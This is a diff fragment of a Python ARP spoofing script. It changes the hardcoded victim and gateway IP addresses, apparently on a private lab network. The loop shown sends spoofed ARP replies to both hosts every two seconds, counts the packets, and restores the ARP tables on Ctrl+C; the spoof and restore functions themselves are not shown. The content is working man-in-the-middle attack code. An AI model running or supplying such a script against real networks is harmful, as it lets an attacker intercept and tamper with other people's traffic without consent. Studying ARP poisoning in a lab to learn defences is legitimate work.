@@ -27,12 +27,12 @@ sent_packets = 0
 try :
 
     while True :
-        spoof("172.16.194.148","172.16.194.2")
-        spoof("172.16.194.2","172.16.194.148")
+        spoof("172.16.175.128","172.16.175.2")
+        spoof("172.16.175.2","172.16.175.128")
         sent_packets += 2
         print("\r[+] packets sent : " + str(sent_packets)),
         sys.stdout.flush()
         time.sleep(2)
 except KeyboardInterrupt :
     print (" \n Detected CRTL+C ..... Restoring ARP tables ")
-    restore("172.16.194.148","172.16.194.2")
+    restore("172.16.175.128","172.16.175.2")
